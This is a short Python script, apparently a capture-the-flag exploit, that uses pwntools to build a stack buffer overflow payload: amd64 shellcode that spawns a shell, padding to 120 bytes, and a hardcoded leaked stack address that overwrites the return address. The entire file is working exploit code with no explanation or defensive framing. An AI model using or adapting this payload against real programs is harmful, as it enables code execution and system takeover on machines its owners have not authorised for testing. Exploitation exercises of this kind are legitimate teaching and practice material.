from pwn import *

#5975 5c5d 6678
address = b'07ffe5d597520'
leak = int(address, 16)
context.arch = "amd64"
payload = asm(shellcraft.sh())
length = len(payload)
payload += b"A"*(120 - length) + p64(leak)
print("---> " + str(payload))